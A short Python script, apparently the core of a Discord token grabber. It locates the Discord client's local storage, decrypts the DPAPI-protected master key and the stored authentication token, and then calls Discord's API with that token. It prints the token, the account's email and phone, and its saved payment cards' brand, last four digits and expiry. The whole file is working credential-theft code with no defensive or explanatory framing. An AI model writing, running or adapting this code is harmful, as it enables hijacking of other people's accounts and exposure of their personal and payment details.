import os, re, json, base64, urllib.request
import win32crypt
from Crypto.Cipher import AES

def get_master_key(appdata_path):
    with open(os.path.join(appdata_path, 'Local State'), 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_token(match, master_key):
    try:
        encrypted = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
        cipher = AES.new(master_key, AES.MODE_GCM, encrypted[3:15])
        return cipher.decrypt(encrypted[15:-16]).decode('utf-8')
    except Exception:
        return None

def get_token():
    appdata      = os.environ['APPDATA']
    discord_path = os.path.join(appdata, 'discord')
    leveldb_path = os.path.join(discord_path, 'Local Storage', 'leveldb')
    master_key   = get_master_key(discord_path)

    for filename in os.listdir(leveldb_path):
        if not filename.endswith(('.ldb', '.log')):
            continue
        try:
            with open(os.path.join(leveldb_path, filename), 'rb') as f:
                content = f.read().decode('utf-8', errors='ignore')
            for match in re.findall(r'dQw4w9WgXcQ:[^"\\]*', content):
                token = decrypt_token(match, master_key)
                if token:
                    return token
        except Exception:
            continue
    return None

def api_request(token, endpoint):
    req = urllib.request.Request(
        f'https://discord.com/api/v9{endpoint}',
        headers={
            'Authorization': token,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9177 Chrome/128.0.6613.186 Electron/32.2.7 Safari/537.36',
            'Content-Type': 'application/json',
            'X-Super-Properties': base64.b64encode(json.dumps({
                "os": "Windows", "browser": "Discord Client",
                "release_channel": "stable", "client_version": "1.0.9177",
                "os_version": "10.0.19045", "system_locale": "en-US"
            }).encode()).decode()
        }
    )
    with urllib.request.urlopen(req) as resp:
        return json.loads(resp.read().decode())

token = get_token()
if not token:
    print("Token not found.")
else:
    print(f"Token: {token}\n")

    user = api_request(token, '/users/@me')
    print(f"Username:     {user.get('username')}")
    print(f"Display name: {user.get('global_name')}")
    print(f"User ID:      {user.get('id')}\n")
    print(f"Email:   {user.get('email')}")
    print(f"Phone:   {user.get('phone')}")

    payments = api_request(token, '/users/@me/billing/payment-sources')
    if not payments:
        print("No payment methods saved.")
    for pm in payments:
        print(f"Brand:   {pm.get('brand', 'N/A')}")
        print(f"Last 4:  {pm.get('last_4', 'N/A')}")
        print(f"Expires: {pm.get('expires_month')}/{pm.get('expires_year')}")
        print(f"Email:   {user.get('email')}")
        print(f"Phone:   {user.get('phone')}")
        print("---")
